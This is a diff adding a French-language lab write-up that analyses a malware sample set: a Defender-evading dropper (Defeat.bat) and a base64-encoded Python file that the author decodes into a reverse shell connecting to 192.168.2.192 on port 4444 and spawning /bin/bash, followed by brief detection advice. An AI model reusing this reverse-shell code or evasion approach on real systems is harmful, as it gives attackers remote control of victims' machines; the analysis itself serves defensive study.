@@ -1,0 +1,77 @@
+1- le server windows detecte le malware.ps1 et la directement identifier comme un trojan comme montrer dans les screenshots. 
+
+
+2- windows defender supprime le malware quelque seconde apres l'analyse .
+
+
+3. une fois le fichier Defeat.bat sur le bureau nous n'observons aucune reaction de windows defender qu'il ne le detecte pas comme un fichier malvaillant.
+
+4- le fichier ne semble pas suspicieux car le scan de windows defender ne trouve aucun danger 
+
+
+5- le fichier defeat n'est pas detecter par l'anti virus car il ne sert juste qu'a telechager des virus et des malware sur la machine 
+
+exemple montrer sure les images 
+
+une fois le fichier ouvert sur le terminal il nous demande ou voulons nous installer le malware 
+
+cela telecharge un autre fichier dat qui est appeler defeat-defender.dat 
+
+6- il nous est demander d'ouvrire le fichier rev.py qui est un fichier coder en python d'ou le .py 
+
+
+le fichier est encoder en base 64 ce qui ne permet pas de lire son contenue alors , j'utilise la commande base64 --decode pour decoder le contenue 
+
+
+
+programe encodrer :
+
+aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKaG9zdCA9ICIxOTIuMTY4LjIuMTkyIgpwb3J0
+ID0gNDQ0NApzID0gc29ja2V0LnNvY2tldCAoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NU
+UkVBTSk7CnMuY29ubmVjdCgoaG9zdCwgcG9ydCkpIApvcy5kdXAyIChzLmZpbGVubyAoKSwgMCkg
+Cm9zLmR1cDIgKHMuZmlsZW5vICgpLDEpCm9zLmR1cDIgKHMuZmlsZW5vICgpLCAyKQpwID0gc3Vi
+cHJvY2Vzcy5hbGwoIi9iaW4vYmFzaCIpCg==
+
+
+programme decoder avec kali linux :
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ base64 --decode rev.py 
+import socket, subprocess, os
+host = "192.168.2.192"
+port = 4444
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM);
+s.connect((host, port)) 
+os.dup2 (s.fileno (), 0) 
+os.dup2 (s.fileno (),1)
+os.dup2 (s.fileno (), 2)
+p = subprocess.all("/bin/bash")
+                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ 
+
+
+Le programme semble être un script Python qui crée une connexion de socket vers un hôte et un port spécifiés. Une fois la connexion établie, il redirige l'entrée standard (stdin), la sortie standard (stdout) et l'erreur standard (stderr) vers le socket, puis exécute un processus secondaire pour exécuter la commande "/bin/bash".
+
+
+l'addresse ip du hacker :
+
+192.168.2.192
+
+
+le port de communication par lequel il communique avec la cible:
+
+4444
+
+
+pour detecter ce genre d'attaque qui est une attaque via reverse shell:
+
+nous devons , surveiller le reseau en utilisant des outils approprier pour detecter les connexion entre notre machine et celle des attaquants 
+
+
+- Surveillez les journaux système pour des activités suspectes, en particulier les journaux liés aux connexions réseau et aux exécutions de processus. Par exemple, examinez les journaux d'authentification et les journaux du système d'exploitation.
+
+
+- Utilisez des outils tels que ps (sur Linux) ou le Gestionnaire des tâches sur Windows pour examiner les processus en cours d'exécution. Recherchez des processus qui semblent anormaux, tels que des shells inattendus ou des processus liés à des connexions réseau suspectes.
+
+et surement d'autre que je ne connais peut etre pas.
